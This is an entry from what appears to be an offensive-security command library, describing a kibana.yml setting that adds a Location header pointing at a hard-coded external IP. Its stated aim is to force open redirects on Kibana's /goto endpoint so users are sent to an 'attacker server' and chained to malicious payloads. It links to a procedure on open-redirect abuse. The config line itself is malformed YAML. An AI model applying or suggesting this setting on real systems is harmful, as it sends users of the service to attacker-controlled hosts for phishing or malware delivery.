---
data: 'server.customResponseHeaders: Location: "http://13.53.201.208:8080"'
tags:
  - kibana
  - config
type: command
output: Kibana restarts with custom headers applied
executor: yaml
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:23:37.126Z'
id: 671645d1-5d6c-4a6e-aae2-93833a5609ce
verified: false
validated: true
submitted: true
---
# configure-custom-response-headers

## Command

```yaml
server.customResponseHeaders: Location: "http://13.53.201.208:8080"
```

## Description

Adds a custom Location header to kibana.yml to force open redirects on the /goto endpoint for chaining to malicious payloads.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| Location | Redirect URL to attacker server | Yes |

## Examples

### Basic Usage

```yaml
server.customResponseHeaders: Location: "http://13.53.201.208:8080"
```

## Expected Output

Config applied after Kibana restart; /goto redirects to specified URL.

## Related

- [[procedures/Configure-Kibana-for-Open-Redirect-Abuse]]
- [[commands/post-reporting-job-pdf]]
